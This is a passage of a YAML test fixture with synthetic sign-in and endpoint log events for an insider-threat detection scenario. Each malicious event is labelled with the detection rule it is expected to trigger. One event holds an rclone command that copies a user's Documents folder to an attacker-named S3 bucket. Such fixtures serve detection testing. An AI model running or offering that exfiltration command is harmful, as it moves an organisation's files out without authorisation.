    category: SignInLogs
    operationName: Sign-in activity
    Level: Informational
    callerIpAddress: 185.220.101.47
    correlationId: entra-insider-001
    properties:
      createdDateTime: '2026-05-22T02:15:00Z'
      userPrincipalName: contractor.jsmith@corp.xyzcompany.com
      userDisplayName: James Smith (Contractor)
      ipAddress: 185.220.101.47
      status:
        errorCode: 0
        failureReason: null
      conditionalAccessStatus: notApplied
      authenticationDetails:
      - authenticationMethod: Password
        succeeded: true
      deviceDetail:
        deviceId: ''
        displayName: ''
        operatingSystem: Windows 10
        browser: Chrome 120.0
      location:
        city: Bucharest
        countryOrRegion: RO
        geoCoordinates:
          latitude: 44.43
          longitude: 26.1
      riskDetail: none
      riskLevelAggregated: none
      clientAppUsed: Browser
- description: Rclone cloud sync tool executed — data staging to external storage
  malicious: true
  scenario: insider_stage_2
  expected_detection: EDR.UDM.Reverse.Shell.Tool.Execution
  event:
    p_log_type: SentinelOne.DeepVisibilityV2
    account.id: xyzcompany-s1-account-01
    event.time: 0
    event.type: ProcessCreation
    event.category: process
    src.process.name: rclone.exe
    src.process.cmdline: rclone.exe copy C:\Users\jsmith\Documents s3:exfil-staging-bucket-attacker/stolen --transfers 32
      --config C:\Users\jsmith\AppData\Roaming\rclone\rclone.conf
    src.process.image.path: C:\Users\jsmith\Downloads\rclone.exe
    src.process.image.sha256: d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5
    src.process.user: BEAZLEY\contractor.jsmith
    src.process.pid: 9901
    src.process.parent.name: explorer.exe
    src.process.parent.image.path: C:\Windows\explorer.exe
    src.process.parent.pid: 3104
    src.process.storyline.id: INSIDER-2026
    network.destination.ip: 185.220.101.47
    network.destination.port: 443
    tgt.process.name: ''
    endpoint.name: WKSTN-CONTRACT-01
    endpoint.os: windows
    agent.uuid: s1-agent-xyzcompany-contract-01
    site.name: corp.xyzcompany.com
- description: Encoded PowerShell — enumerating and staging sensitive files
  malicious: true
  scenario: insider_stage_2
  expected_detection: EDR.UDM.Base64.Encoded.Cmdline
